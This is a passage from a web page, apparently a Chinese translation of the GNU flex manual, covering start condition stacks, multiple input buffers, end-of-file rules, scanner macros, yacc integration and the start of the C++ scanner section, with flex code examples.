class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">%x comment</span><br><span class="line">%%</span><br><span class="line">        int line_num &#x3D; 1;</span><br><span class="line"></span><br><span class="line">&quot;&#x2F;*&quot;         BEGIN(comment);</span><br><span class="line"></span><br><span class="line">&lt;comment&gt;[^*\n]*        &#x2F;* eat anything that&#39;s not a &#39;*&#39; *&#x2F;</span><br><span class="line">&lt;comment&gt;&quot;*&quot;+[^*&#x2F;\n]*   &#x2F;* eat up &#39;*&#39;s not followed by &#39;&#x2F;&#39;s *&#x2F;</span><br><span class="line">&lt;comment&gt;\n             ++line_num;</span><br><span class="line">&lt;comment&gt;&quot;*&quot;+&quot;&#x2F;&quot;        BEGIN(INITIAL);</span><br></pre></td></tr></table></figure><p>请注意，起始条件名称实际上是以整数值存储。因此，上述内容可以通过以下方式扩展：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">%x comment foo</span><br><span class="line">%%</span><br><span class="line">        int line_num &#x3D; 1;</span><br><span class="line">        int comment_caller;</span><br><span class="line"></span><br><span class="line">&quot;&#x2F;*&quot;         &#123;</span><br><span class="line">             comment_caller &#x3D; INITIAL;</span><br><span class="line">             BEGIN(comment);</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;foo&gt;&quot;&#x2F;*&quot;    &#123;</span><br><span class="line">             comment_caller &#x3D; foo;</span><br><span class="line">             BEGIN(comment);</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">&lt;comment&gt;[^*\n]*        &#x2F;* eat anything that&#39;s not a &#39;*&#39; *&#x2F;</span><br><span class="line">&lt;comment&gt;&quot;*&quot;+[^*&#x2F;\n]*   &#x2F;* eat up &#39;*&#39;s not followed by &#39;&#x2F;&#39;s *&#x2F;</span><br><span class="line">&lt;comment&gt;\n             ++line_num;</span><br><span class="line">&lt;comment&gt;&quot;*&quot;+&quot;&#x2F;&quot;        BEGIN(comment_caller);</span><br></pre></td></tr></table></figure><p>此外，您可以使用整数值YY_START宏访问当前的start condition。例如，上面的分配comment_caller可以改为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">comment_caller &#x3D; YY_START；</span><br></pre></td></tr></table></figure><p>Flex提供YYSTATE作为YY_START的别名(因为AT＆T使用了它)。</p><p>最后，这是一个示例，说明如何使用排他的开始条件来匹配C样式的带引号的字符串，包括扩展的转义序列(但不包括检查过长的字符串)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">%x str</span><br><span class="line"></span><br><span class="line">   %%</span><br><span class="line">           char string_buf[MAX_STR_CONST];</span><br><span class="line">           char *string_buf_ptr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   \&quot;      string_buf_ptr &#x3D; string_buf; BEGIN(str);</span><br><span class="line"></span><br><span class="line">   &lt;str&gt;\&quot;        &#123; &#x2F;* saw closing quote - all done *&#x2F;</span><br><span class="line">           BEGIN(INITIAL);</span><br><span class="line">           *string_buf_ptr &#x3D; &#39;\0&#39;;</span><br><span class="line">           &#x2F;* return string constant token type and</span><br><span class="line">            * value to parser</span><br><span class="line">            *&#x2F;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">   &lt;str&gt;\n        &#123;</span><br><span class="line">           &#x2F;* error - unterminated string constant *&#x2F;</span><br><span class="line">           &#x2F;* generate error message *&#x2F;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">   &lt;str&gt;\\[0-7]&#123;1,3&#125; &#123;</span><br><span class="line">           &#x2F;* octal escape sequence *&#x2F;</span><br><span class="line">           int result;</span><br><span class="line"></span><br><span class="line">           (void) sscanf( yytext + 1, &quot;%o&quot;, &amp;result );</span><br><span class="line"></span><br><span class="line">           if ( result &gt; 0xff )</span><br><span class="line">                   &#x2F;* error, constant is out-of-bounds *&#x2F;</span><br><span class="line"></span><br><span class="line">           *string_buf_ptr++ &#x3D; result;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">   &lt;str&gt;\\[0-9]+ &#123;</span><br><span class="line">           &#x2F;* generate error - bad escape sequence; something</span><br><span class="line">            * like &#39;\48&#39; or &#39;\0777777&#39;</span><br><span class="line">            *&#x2F;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">   &lt;str&gt;\\n  *string_buf_ptr++ &#x3D; &#39;\n&#39;;</span><br><span class="line">   &lt;str&gt;\\t  *string_buf_ptr++ &#x3D; &#39;\t&#39;;</span><br><span class="line">   &lt;str&gt;\\r  *string_buf_ptr++ &#x3D; &#39;\r&#39;;</span><br><span class="line">   &lt;str&gt;\\b  *string_buf_ptr++ &#x3D; &#39;\b&#39;;</span><br><span class="line">   &lt;str&gt;\\f  *string_buf_ptr++ &#x3D; &#39;\f&#39;;</span><br><span class="line"></span><br><span class="line">   &lt;str&gt;\\(.|\n)  *string_buf_ptr++ &#x3D; yytext[1];</span><br><span class="line"></span><br><span class="line">   &lt;str&gt;[^\\\n\&quot;]+        &#123;</span><br><span class="line">           char *yptr &#x3D; yytext;</span><br><span class="line"></span><br><span class="line">           while ( *yptr )</span><br><span class="line">                   *string_buf_ptr++ &#x3D; *yptr++;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure><p>通常，例如在上面的某些示例中，您最终要编写一堆规则，所有规则都以相同的开始条件开头。通过引入启动条件范围的概念，Flex使此操作变得更加轻松和简洁。起始条件范围始于：<code>&lt;SCs&gt; {</code><br>其中<code>&lt;SCs&gt;</code>是一个或多个开始条件的列表。在开始条件范围内，每个规则都会自动为其应用前缀<code>&lt;SCs&gt;</code>，直到遇到匹配的“}“。因此，例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;ESC&gt;&#123;</span><br><span class="line">    &quot;\\n&quot;   return &#39;\n&#39;;</span><br><span class="line">    &quot;\\r&quot;   return &#39;\r&#39;;</span><br><span class="line">    &quot;\\f&quot;   return &#39;\f&#39;;</span><br><span class="line">    &quot;\\0&quot;   return &#39;\0&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>等价于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;ESC&gt;&quot;\\n&quot;  return &#39;\n&#39;;</span><br><span class="line">&lt;ESC&gt;&quot;\\r&quot;  return &#39;\r&#39;;</span><br><span class="line">&lt;ESC&gt;&quot;\\f&quot;  return &#39;\f&#39;;</span><br><span class="line">&lt;ESC&gt;&quot;\\0&quot;  return &#39;\0&#39;;</span><br></pre></td></tr></table></figure><p>起始条件范围可以嵌套。<br>以下routines可用于操纵开始条件的堆栈：</p><ul><li><p><code>void yy_push_state (int new_state)</code><br>  将当前启动条件推送到启动条件堆栈的顶部，并切换到 new_state, 就好像您曾经使用过的一样 BEGIN new_state (请注意，启动条件名称也是整数)。</p></li><li><p><code>void yy_pop_state ()</code><br>  弹出堆栈的顶部，然后切换到堆栈的顶部BEGIN。</p></li><li><p><code>int yy_top_state ()</code><br>  返回堆栈的顶部而不更改堆栈的内容。</p></li></ul><p>起始条件堆栈会动态增长，因此没有内置的大小限制。如果内存耗尽，程序将中止执行。<br>要使用开始条件堆栈，scanner必须包含一个%option stack指令(请参阅scanner选项)。</p><h2 id="11-Multiple-Input-Buffers"><a href="#11-Multiple-Input-Buffers" class="headerlink" title="11 Multiple Input Buffers"></a>11 Multiple Input Buffers</h2><p>一些scanner(例如支持“ include”文件的scanner)需要从多个输入流中读取。由于Flex扫描程序会进行大量缓冲，因此无法通过简单地重写对扫描上下文敏感的<code>YY_INPUT()</code>来控制将从下一个输入读取的位置。<br><code>YY_INPUT()</code>仅在扫描程序到达其缓冲区的末尾时才调用，这可能是在扫描诸如include语句之类的语句(会花费)很长的时间，(在这之后)，该语句要求切换输入源。</p><p>为了解决这类问题，flex提供了一种创建多个输入缓冲区之间和切换的机制。输入缓冲区是通过使用以下命令创建的：</p><ul><li><code>YY_BUFFER_STATE  yy_create_buffer( FILE *file, int size )</code></li></ul><p>参数是FILE指针和size，并创建与给定文件关联的缓冲区，缓冲区足够大以容纳size大小的字符(发生问题时，试试使用<code>YY_BUF_SIZE</code>作为大小)。它返回一个<code>YY_BUFFER_STATE</code>句柄，可以用来将其传递给其他例程(请参见下文)。<br><code>YY_BUFFER_STATE</code>类型是指向opaque structure <code>yy_buffer_state</code>结构的指针，因此您可以根据需要将<code>YY_BUFFER_STATE</code>变量安全地初始化为<code>((YY_BUFFER_STATE)0)</code>，还可以引用opaque structure以正确声明源文件中的输入缓冲区(而非源文件中的scanner)。请注意，调用<code>yy_create_buffer</code>时的FILE指针仅用作<code>YY_INPUT</code>看到的<code>yyin</code>值。如果重新定义<code>YY_INPUT()</code>使其不再使用<code>yyin</code>，则可以安全地将NULL<br>FILE指针传递给<code>yy_create_buffer</code>。</p><p>您可以使用以下方法选择要扫描的特定缓冲区：</p><ul><li><code>void yy_switch_to_buffer ( YY_BUFFER_STATE new_buffer )</code></li></ul><p>这个函数可切换扫描器的输入缓冲区，使得后续tokens将来自new_buffer。请注意，<code>yywrap()</code>可以使用<code>yy_switch_to_buffer()</code>来设置要继续扫描的内容，而不是打开新文件并用<code>yyin</code>指向它。如果您正在寻找输入缓冲区的堆栈，那么您想使用<code>yypush_buffer_state()</code>代替此函数。还要注意，通过<code>yy_switch_to_buffer()</code>或<code>yywrap()</code>切换输入源不会更改启动条件。</p><ul><li><code>void yy_delete_buffer ( YY_BUFFER_STATE buffer )</code></li></ul><p>用于回收与缓冲区关联的存储。 (缓冲区可以为NULL，在这种情况下例程不执行任何操作。)</p><p>您还可以使用以下方法清除缓冲区的当前内容：</p><ul><li><code>void yypush_buffer_state( YY_BUFFER_STATE buffer )</code></li></ul><p>该函数将新的缓冲区状态压入内部栈。压入的状态变为新的当前状态。栈由flex维护，并将根据需要增长。当您要更改状态时，应使用此函数代替<code>yy_switch_to_buffer</code>，但保留当前状态以供以后使用。</p><ul><li><code>void yypop_buffer_state ( )</code></li></ul><p>此函数从栈顶部弹出当前状态，并通过调用<code>yy_delete_buffer</code>删除它。堆栈中的下一个状态(如果有)将成为新的当前状态。</p><p><code>void yy_flush_buffer ( YY_BUFFER_STATE buffer )</code></p><p>此函数会丢弃缓冲区的内容，因此，下次扫描程序尝试从缓冲区中匹配token时，它将首先使用<code>YY_INPUT()</code>重新填充缓冲区。</p><p><code>YY_BUFFER_STATE yy_new_buffer ( FILE *file, int size )</code></p><p>是<code>yy_create_buffer()</code>的别名，用于兼容 C ++的new和delete用于创建和销毁动态对象。<br><code>YY_CURRENT_BUFFER</code>宏将<code>YY_BUFFER_STATE</code>句柄返回到当前缓冲区。不应将其用作左值。</p><p>这是使用这些功能编写扩展包含文件的scanner的两个示例(下面将讨论&lt;&lt; EOF &gt;&gt;功能)。</p><p>第一个示例使用<code>yypush_buffer_state</code>和<code>yypop_buffer_state</code>。 Flex在维护一个内部栈。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* the &quot;incl&quot; state is used for picking up the name</span><br><span class="line">    * of an include file</span><br><span class="line">    *&#x2F;</span><br><span class="line">   %x incl</span><br><span class="line">   %%</span><br><span class="line">   include             BEGIN(incl);</span><br><span class="line"></span><br><span class="line">   [a-z]+              ECHO;</span><br><span class="line">   [^a-z\n]*\n?        ECHO;</span><br><span class="line"></span><br><span class="line">   &lt;incl&gt;[ \t]*      &#x2F;* eat the whitespace *&#x2F;</span><br><span class="line">   &lt;incl&gt;[^ \t\n]+   &#123; &#x2F;* got the include file name *&#x2F;</span><br><span class="line">           yyin &#x3D; fopen( yytext, &quot;r&quot; );</span><br><span class="line"></span><br><span class="line">           if ( ! yyin )</span><br><span class="line">               error( ... );</span><br><span class="line"></span><br><span class="line">yypush_buffer_state(yy_create_buffer( yyin, YY_BUF_SIZE ));</span><br><span class="line"></span><br><span class="line">           BEGIN(INITIAL);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">   &lt;&lt;EOF&gt;&gt; &#123;</span><br><span class="line">yypop_buffer_state();</span><br><span class="line"></span><br><span class="line">           if ( !YY_CURRENT_BUFFER )</span><br><span class="line">               &#123;</span><br><span class="line">               yyterminate();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure><p>下面的第二个示例执行与上一个示例相同的操作，但是手动管理其自己的输入缓冲区栈(而不是让flex进行操作)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* the &quot;incl&quot; state is used for picking up the name</span><br><span class="line">     * of an include file</span><br><span class="line">     *&#x2F;</span><br><span class="line">    %x incl</span><br><span class="line"></span><br><span class="line">    %&#123;</span><br><span class="line">    #define MAX_INCLUDE_DEPTH 10</span><br><span class="line">    YY_BUFFER_STATE include_stack[MAX_INCLUDE_DEPTH];</span><br><span class="line">    int include_stack_ptr &#x3D; 0;</span><br><span class="line">    %&#125;</span><br><span class="line"></span><br><span class="line">    %%</span><br><span class="line">    include             BEGIN(incl);</span><br><span class="line"></span><br><span class="line">    [a-z]+              ECHO;</span><br><span class="line">    [^a-z\n]*\n?        ECHO;</span><br><span class="line"></span><br><span class="line">    &lt;incl&gt;[ \t]*      &#x2F;* eat the whitespace *&#x2F;</span><br><span class="line">    &lt;incl&gt;[^ \t\n]+   &#123; &#x2F;* got the include file name *&#x2F;</span><br><span class="line">            if ( include_stack_ptr &gt;&#x3D; MAX_INCLUDE_DEPTH )</span><br><span class="line">                &#123;</span><br><span class="line">                fprintf( stderr, &quot;Includes nested too deeply&quot; );</span><br><span class="line">                exit( 1 );</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            include_stack[include_stack_ptr++] &#x3D;</span><br><span class="line">                YY_CURRENT_BUFFER;</span><br><span class="line"></span><br><span class="line">            yyin &#x3D; fopen( yytext, &quot;r&quot; );</span><br><span class="line"></span><br><span class="line">            if ( ! yyin )</span><br><span class="line">                error( ... );</span><br><span class="line"></span><br><span class="line">            yy_switch_to_buffer(</span><br><span class="line">                yy_create_buffer( yyin, YY_BUF_SIZE ) );</span><br><span class="line"></span><br><span class="line">            BEGIN(INITIAL);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    &lt;&lt;EOF&gt;&gt; &#123;</span><br><span class="line">            if ( --include_stack_ptr  0 )</span><br><span class="line">                &#123;</span><br><span class="line">                yyterminate();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            else</span><br><span class="line">                &#123;</span><br><span class="line">                yy_delete_buffer( YY_CURRENT_BUFFER );</span><br><span class="line">                yy_switch_to_buffer(</span><br><span class="line">                     include_stack[include_stack_ptr] );</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>以下例程可用于设置输入缓冲区以扫描内存中的字符串而不是文件。它们都创建了一个新的输入缓冲区来扫描字符串，并返回一个对应的<code>YY_BUFFER_STATE</code>句柄(完成后应使用<code>yy_delete_buffer()</code>删除)。还使用<code>yy_switch_to_buffer()</code>切换到新缓冲区，因此对<code>yylex()</code>的下一次调用将开始扫描这个字符串。</p><ul><li><code>YY_BUFFER_STATE yy_scan_string ( const char *str )</code></li></ul><p>扫描NULL结尾的字符串</p><ul><li><code>YY_BUFFER_STATE yy_scan_bytes ( const char *bytes, int len )</code></li></ul><p>扫描len长度(包括NULL)的字符串</p><p>请注意，这两个函数都会创建并扫描字符串或字节的副本。 (这可能是可取的，因为<code>yylex()</code>修改了它正在扫描的缓冲区的内容。)您可以使用以下方法避免复制：</p><ul><li><code>YY_BUFFER_STATE yy_scan_buffer (char *base, yy_size_t size)</code></li></ul><p>它将扫描从基址开始的缓冲区，该缓冲区由size大小字节组成，其最后两个字节必须为<code>YY_END_OF_BUFFER_CHAR(ASCII NUL)</code>。最后两个字节不扫描。因此，扫描由base [0]到base [size-2]组成。</p><p>如果您无法以这种方式设置base(即忘记最后两个<code>YY_END_OF_BUFFER_CHAR</code>字节)，则<code>yy_scan_buffer()</code>将返回NULL指针，而不是创建新的输入缓冲区。</p><p>Data type: <code>yy_size_t</code></p><p>是整数类型，您可以将其转换为反映缓冲区大小的整数表达式。</p><h2 id="12-End-of-File-Rules"><a href="#12-End-of-File-Rules" class="headerlink" title="12 End-of-File Rules"></a>12 End-of-File Rules</h2><p>特殊规则<code>&lt;&lt;EOF&gt;&gt;</code>指示遇到文件结尾符(end-of-file)和<code>yywrap()</code>返回非零值时，要采取的action(即，表示没有其他要处理的文件)。该action必须通过执行以下任一action来完成：</p><ul><li>分配 yyin 到新的输入文件(在的<code>flex</code>早期版本中 ，完成分配后，您必须调用特殊action<code>YY_NEW_FILE</code>。现在，这不再是必需的。)</li><li>执行一条<code>return</code>语句；</li><li>执行<code>yyterminate()</code>特殊action。</li><li>或者，如上例所示，用<code>yy_switch_to_buffer()</code>切换到新的缓冲区。</li></ul><p><code>&lt;&lt;EOF&gt;&gt;</code>规则不得与其他pattern一起使用，他们可能只能用start condition进行限定。如果给出了未限定的<code>&lt;&lt;EOF&gt;&gt;</code>规则，则该规则适用于它适用于尚未执行<code>&lt;&lt;EOF&gt;&gt;</code>action的所有启动条件。。要只为初始开始条件指名<code>&lt;&lt;EOF&gt;&gt;</code>规则，请使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;INITIAL&gt;&lt;&lt;EOF&gt;&gt;</span><br></pre></td></tr></table></figure><p>这些规则对于捕获未封闭的注释(comments)等有用。例子如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> %x quote</span><br><span class="line"> %%</span><br><span class="line"></span><br><span class="line"> ...other rules for dealing with quotes...</span><br><span class="line"></span><br><span class="line"> &lt;quote&gt;&lt;&lt;EOF&gt;&gt;   &#123;</span><br><span class="line">          error( &quot;unterminated quote&quot; );</span><br><span class="line">          yyterminate();</span><br><span class="line">          &#125;</span><br><span class="line">&lt;&lt;EOF&gt;&gt;  &#123;</span><br><span class="line">          if ( *++filelist )</span><br><span class="line">              yyin &#x3D; fopen( *filelist, &quot;r&quot; );</span><br><span class="line">          else</span><br><span class="line">             yyterminate();</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><h2 id="13-Miscellaneous-Macros"><a href="#13-Miscellaneous-Macros" class="headerlink" title="13 Miscellaneous Macros"></a>13 Miscellaneous Macros</h2><p><code>YY_USER_ACTION</code> 可以定义宏以提供始终在匹配规则的操作之前执行的操作。例如，可以使用<code>#define’d</code>去调用一个routine以将yytext转换为小写，当<code>YY_USER_ACTION</code> 被调用，(规则编号从1开始)匹配的规则编号会保存在变量<code>yy_act</code>中。如果你想知道每一个规则的匹配频率，请看下面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define YY_USER_ACTION ++ctr[yy_act]</span><br></pre></td></tr></table></figure><p><code>ctr</code> 是一个数组，用于保存不同规则的计数结果。请注意，<code>YY_NUM_RULES</code> 宏命令给出了规则总数(包括默认规则)，即使你使用 ‘-s)’，所以，正确的<code>ctr</code>声明是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int ctr[YY_NUM_RULES];</span><br></pre></td></tr></table></figure><p><code>YY_USER_INIT</code>可以定义宏以提供始终在第一次扫描之前(以及在完成扫描器的内部初始化之前)执行的操作。例如，它可以被用来调用一个例程(routine )来读入数据或者打开一个日志文件。</p><p>宏<code>yy_set_interactive(is_interactive)</code>可以被用来控制当前缓冲区是否被认为是交互式的。一个交互式的缓冲区处理速度较慢，但是当扫描器的输入源是交互式时，必须使用交互式缓冲区，以避免由于等待填充缓冲区而引出的问题(请参阅 <a href="http://westes.github.io/flex/manual/Scanner-Options.html#Scanner-Options" target="_blank" rel="noopener">Scanner Options</a> 一文中关于‘-I’ flag的讨论)。<br>宏调用中的非零值会将缓冲区标记为交互式，零值记为非交互式的。请注意，这个宏的使用将覆盖<code>%option always-interactive</code>和 <code>%option never-interactive</code> (参阅 <a href="http://westes.github.io/flex/manual/Scanner-Options.html#Scanner-Options" target="_blank" rel="noopener">Scanner Options</a>)。`yy_set_interactive必须在开始扫描交互式(或者非交互式)缓冲区之前调用。</p><p>The macro yy_set_bol(at_bol) can be used to control whether the current buffer’s scanning context for the next token match is done as though at the beginning of a line. A non-zero macro argument makes rules anchored with ‘^’ active, while a zero argument makes ‘^’ rules inactive.</p><p>如果从当前缓冲区扫描的下一个token将启用“^”规则，则宏YY_AT_BOL()返回true，否则返回false。</p><p>在生成的扫描程序中，所有actions都收集在一个大的switch语句中，并使用<code>YY_BREAK</code>分开，<code>YY_BREAK</code>可以被重新定义。<br>默认情况下，它只是一个<code>break</code>，用于将每个规则的action与后面规则的action分开。<br>允许对<code>YY_BREAK</code> 重新定义，例如，C++用户可以通过#define YY_BREAK 来让YY_BREAK不执行任何操作(要非常小心，每个规则都需要以一个<code>break</code>或一个<code>return</code>结尾！)，以避免遇到提示编译warnning(unreachable statement)，因为规则的action以<code>return</code>的话，则<code>YY_BREAK</code>无法访问到。</p><h2 id="14-Values-Available-To-the-User"><a href="#14-Values-Available-To-the-User" class="headerlink" title="14 Values Available To the User"></a>14 Values Available To the User</h2><p>本节总结了在rule actions下，可供用户使用的一些值:</p><ul><li><p><code>char *yytext</code></p><p>维护当前token的文本信息，它可以被修改，但是不能加长，即不能在末尾添加字符。</p><p>如果特殊的directive %array出现在scanner description的first section，那么<code>yytext</code>将被声明为<code>char yytext[YYLMAX]</code>.</p><p><code>YYLMAX</code>是一个宏定义，默认值为<code>8KB</code>，你可以在first section重定义它的大小。 使用<code>％array</code>会导致scanner的速度稍慢一些，但是<code>yytext</code>的值不受<code>unput()</code>调用的影响。当<code>yytext</code>是字符指针时，<code>unput()</code>可能会破坏其值。与％array相对的是％pointer，%pointer是默认设置。<br>生成c++ scanner(开启“-+”flag)时，不能使用％array。</p></li><li><p><code>int yyleng</code></p><p>保存当前token的长度</p></li><li><p><code>FILE *yyin</code></p><p>是默认情况下flex读取的文件。它可以重新定义，但只有在开始扫描之前或遇到<code>EOF</code>之后才有意义。在扫描过程中更改它会产生意外结果，因为flex会缓存其输入。当由于遇到<code>EOF</code>而终止扫描后，可以重新分配<code>yyin</code>指向新的输入文件，然后再次调用scanner以继续扫描。</p></li><li><p><code>void yyrestart( FILE *new_file )</code></p><p>可以将<code>yyin</code>指向新的输入文件。立即切换到新文件(任何先前缓存的输入都将丢失)。请注意，使用<code>yyin</code>作为参数调用<code>yyrestart()</code>会丢弃当前的输入缓冲区(input buffer)，并继续扫描相同的输入文件。</p></li><li><p><code>FILE *yyout</code></p><p>是执行ECHO操作的文件。可以由用户重新定义。</p></li><li><p><code>YY_CURRENT_BUFFER</code></p><p>返回 <code>YY_BUFFER_STATE</code> 句柄到当前的缓冲区</p></li><li><p><code>YY_START</code><br>返回与当前开始条件相对应的整数值。随后，您可以将这个值与BEGIN一起使用以返回到该开始条件。</p></li></ul><h2 id="15-Interfacing-with-Yacc"><a href="#15-Interfacing-with-Yacc" class="headerlink" title="15 Interfacing with Yacc"></a>15 Interfacing with Yacc</h2><p>flex的主要用途之一是与yacc解析器生成器一起使用。 yacc解析器应当调用<code>yylex()</code>来查找下一个输入token。yylex应返回下一个token的类型，并将所有关联的值放入全局变量<code>yylval</code>中。<br>要将flex与yacc一起使用，请为yacc指定“-d”选项，来生成文件y.tab.h，其中包含所有出现在yacc输入中的<code>％token</code>的定义。<br>然后，将此文件包含在Flex scanner中。例如，如果token之一是<code>TOK_NUMBER</code>，则scanner的一部分可能看起来像：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">#include &quot;y.tab.h&quot;</span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">[0-9]+        yylval &#x3D; atoi( yytext ); return TOK_NUMBER;</span><br></pre></td></tr></table></figure><h2 id="16-Scanner-Options"><a href="#16-Scanner-Options" class="headerlink" title="16 Scanner Options"></a>16 Scanner Options</h2><p>//todo</p><h2 id="17-Performance-Considerations"><a href="#17-Performance-Considerations" class="headerlink" title="17 Performance Considerations"></a>17 Performance Considerations</h2><p>//todo</p><h2 id="18-Generating-C-Scanners"><a href="#18-Generating-C-Scanners" class="headerlink" title="18 Generating C++ Scanners"></a>18 Generating C++ Scanners</h2><p>重要:当前的扫描类的形式是实验性的，并且在各主要版本中有较大的不同。</p><p>flex提供两种不同的方式来生成用于C++的scanner。第一种方式就是简单的编译一个由flex生成的scanner，scanner由C++编译而不是C编译。你应该不会遇到任何编译错误(有就查看错误报告)。你可以在rule actions中使用C++代码而不是C代码。注意scanner的默认输入源仍然是 yyin, 默认回显仍然是 yyout。这两者都是 FILE* 变量，而不是C++流。</p><p>你也可以使用flex去生成一个C++ scanner类，使用’-+’选项(或者，相等的，%option c++)，如果flex可执行文件的名称以”+”结尾，则会自动指定，比如 flex++。<br>当使用此选项时，flex默认将扫描程序生成为文件lex.yy.cc 而不是 lex.yy.c。生成的扫描程序包括头文件 